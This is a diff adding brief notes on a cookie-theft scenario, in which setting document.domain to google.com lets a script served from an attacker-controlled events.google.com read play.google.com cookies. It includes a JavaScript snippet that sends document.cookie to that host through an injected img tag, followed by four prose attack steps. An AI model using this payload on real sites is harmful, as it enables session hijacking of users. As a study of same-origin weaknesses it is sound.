@@ -1,0 +1,30 @@
+no need for cookie SOP path separation
+
+document.domain = "google.com";
+x = document.cookie;
+var url = 'http://events.google.com/res?id=' + encodeURI(document.cookie);    
+console.log(url);
+document.write('<img src=' + url + '/>');
+
+<script src=google.com/events.js>
+
+step 1 :
+
+the attacker has control of the events.google.com
+it hosts a cookie stealing script called event.html/js
+
+it then inject <script src=events.google.com/event.js> or <iframe src=events.google.com/event.html> into the apps.html page located in the play.google.com domain 
+
+step 2 :
+
+the attacker gets the user victim to visit play.google.com/apps.html
+the client retrieves the page, the effective domain gets changed to google.com, and the script event.js gets executed
+
+step 3 :
+
+event.js gets to read the cookie set by play.google.com, as they share the same domain
+thus, cookies set by play.google.com can be read and set by any script sharing the same origin (here, google.com)
+
+step 4 :
+
+the cookie is then sent to events.google.com, the cookie was stolen
